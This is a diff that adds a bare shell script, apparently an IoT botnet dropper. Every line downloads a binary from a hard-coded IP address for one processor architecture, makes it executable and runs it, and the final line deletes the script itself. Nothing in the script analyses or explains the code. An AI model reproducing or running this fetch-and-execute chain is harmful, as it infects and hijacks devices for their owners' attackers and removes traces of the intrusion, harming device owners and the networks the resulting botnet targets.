@@ -1,0 +1,14 @@
+busybox wget http://193.32.162.27/bins/parm; chmod 777 parm; ./parm new
+busybox wget http://193.32.162.27/bins/parm5; chmod 777 parm5; ./parm5 new
+busybox wget http://193.32.162.27/bins/parm6; chmod 777 parm6; ./parm6 new
+busybox wget http://193.32.162.27/bins/parm7; chmod 777 parm7; ./parm7 new
+busybox wget http://193.32.162.27/bins/psh4; chmod 777 psh4; ./psh4 new
+busybox wget http://193.32.162.27/bins/pppc; chmod 777 pppc; ./pppc new
+busybox wget http://193.32.162.27/bins/pmips; chmod 777 pmips; ./pmips new
+busybox wget http://193.32.162.27/bins/pmpsl; chmod 777 pmpsl; ./pmpsl new
+busybox wget http://193.32.162.27/bins/pspc; chmod 777 pspc; ./pspc new
+busybox wget http://193.32.162.27/bins/px86; chmod 777 px86; ./px86 new
+busybox wget http://193.32.162.27/bins/pm68k; chmod 777 pm68k; ./pm68k new
+
+
+rm $0
